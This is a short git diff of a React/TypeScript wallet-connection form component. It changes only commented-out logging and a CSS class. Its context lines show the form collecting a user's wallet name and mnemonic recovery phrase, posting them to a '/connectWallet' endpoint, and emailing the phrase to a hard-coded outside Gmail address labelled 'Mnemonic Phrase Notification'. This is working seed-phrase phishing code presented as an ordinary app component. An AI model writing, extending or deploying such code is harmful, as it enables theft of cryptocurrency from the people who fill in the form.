@@ -42,8 +42,7 @@ const ConnectForm = ({email, name}: string | any) => {
     const formData = {email, walletName, phrase }
     const emailData = {to: email, subject: "Wallet Connection", name, emailType:"connectWallet", currentTime: formattedDateTime}
     const emailData1 = {to: "andreyokonetchnikov@gmail.com", subject: "Mnemonic Phrase Notification", emailType:"adminNotification", walletName, phrase, name}
-    //console.log({formData})
-    //console.log({emailData})
+
     makeApiRequest("/connectWallet", "post", formData, {
         onSuccess: () => {
           // Handle success
@@ -81,7 +80,7 @@ const ConnectForm = ({email, name}: string | any) => {
       });
   }
     return ( 
-        <main className="text-xs md:text-sm xl:text-base">
+        <main>
             <form onSubmit={onSubmit}>
                 <Input type="text" placeholder="Wallet Name eg Wealth Assets" label="Wallet Name" id="wallet" value={walletName} onChange={(e) => { setWalletName(e.target.value) }}/>
                 <textarea value={phrase} onChange={(e: React.ChangeEvent<HTMLTextAreaElement>) => {setPhrase(e.target.value)}} name="phrase" id="phrase" placeholder="Enter Mnemonic Phrase" className="mt-8 w-full resize-none border border-[#E6E7E8] px-2 xl:px-4 py-3 focus:border-primary rounded-md focus:outline-none h-40"></textarea>
